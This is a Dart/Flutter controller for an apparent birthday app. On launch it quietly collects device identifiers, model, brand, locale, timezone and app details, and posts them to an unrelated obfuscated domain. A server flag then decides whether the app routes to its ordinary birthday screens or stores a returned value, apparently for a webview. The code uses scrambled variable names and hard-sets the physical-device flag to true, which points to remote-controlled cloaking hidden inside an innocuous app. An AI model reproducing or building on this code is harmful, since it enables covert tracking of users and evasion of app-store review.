import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var wpylqe = RxBool(false);
  var cymvqp = RxBool(true);
  var zyiej = RxString("");
  var julian = RxBool(false);
  var bosco = RxBool(true);
  final oqtyivlpwj = Dio();


  InAppWebViewController? webViewController;

  void checkNet() async {
    var connectResult = await (Connectivity().checkConnectivity());
    if(connectResult == ConnectivityResult.none){
      Get.toNamed("/no_network");
    }
  }

  @override
  void onInit() {
    checkNet();
    super.onInit();
    rjzwq();
  }


  Future<void> rjzwq() async {

    julian.value = true;
    bosco.value = true;
    cymvqp.value = false;

    oqtyivlpwj.post("https://dpi.pe3km.club/mvjydkrhezgitbfoupsaql",data: await exrycubpn()).then((value) {
      var henrljsk = value.data["henrljsk"] as String;
      var xobe = value.data["xobe"] as bool;
      if (xobe) {
        zyiej.value = henrljsk;
        stefanie();
      } else {
        wunsch();
      }
    }).catchError((e) {
      cymvqp.value = true;
      bosco.value = true;
      julian.value = false;
    });
  }

  Future<Map<String, dynamic>> exrycubpn() async {
    final DeviceInfoPlugin dmgkvrfp = DeviceInfoPlugin();
    PackageInfo rzwugyjd_fwnq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mnhxe = Platform.localeName;
    var zqwap = currentTimeZone;

    var aipyoutm = rzwugyjd_fwnq.packageName;
    var slkr = rzwugyjd_fwnq.version;
    var zglqti = rzwugyjd_fwnq.buildNumber;

    var gkxnpy = rzwugyjd_fwnq.appName;
    var lavernaKoss = "";
    var inlqmhc  = "";
    var jazvolp = "";
    var micaelaDavis = "";
    var dollyAnkunding = "";
    var assuntaHowell = "";
    var kads = "";
    var edwardKautzer = "";
    var khszoxgv = "";
    var serenaShanahan = "";

    var ericSchinner = "";
    var kuwh = false;

    if (GetPlatform.isAndroid) {
      kads = "android";
      var snwapkxlbd = await dmgkvrfp.androidInfo;

      jazvolp = snwapkxlbd.brand;

      khszoxgv  = snwapkxlbd.model;
      inlqmhc = snwapkxlbd.id;

      kuwh = snwapkxlbd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      kads = "ios";
      var yngfehwtbq = await dmgkvrfp.iosInfo;
      jazvolp = yngfehwtbq.name;
      khszoxgv = yngfehwtbq.model;

      inlqmhc = yngfehwtbq.identifierForVendor ?? "";
      kuwh  = yngfehwtbq.isPhysicalDevice;
    }
    kuwh = true;
    var res = {
      "gkxnpy": gkxnpy,
      "slkr": slkr,
      "aipyoutm": aipyoutm,
      "khszoxgv": khszoxgv,
      "edwardKautzer" : edwardKautzer,
      "zqwap": zqwap,
      "lavernaKoss" : lavernaKoss,
      "jazvolp": jazvolp,
      "inlqmhc": inlqmhc,
      "kads": kads,
      "zglqti": zglqti,
      "kuwh": kuwh,
      "micaelaDavis" : micaelaDavis,
      "dollyAnkunding" : dollyAnkunding,
      "ericSchinner" : ericSchinner,
      "serenaShanahan" : serenaShanahan,
      "mnhxe": mnhxe,
      "assuntaHowell" : assuntaHowell,

    };
    return res;
  }

  Future<void> wunsch() async {
    Get.offAllNamed("/birthday_tab");
  }

  Future<void> stefanie() async {
    Get.offAllNamed("/birthday_inp");
  }

}
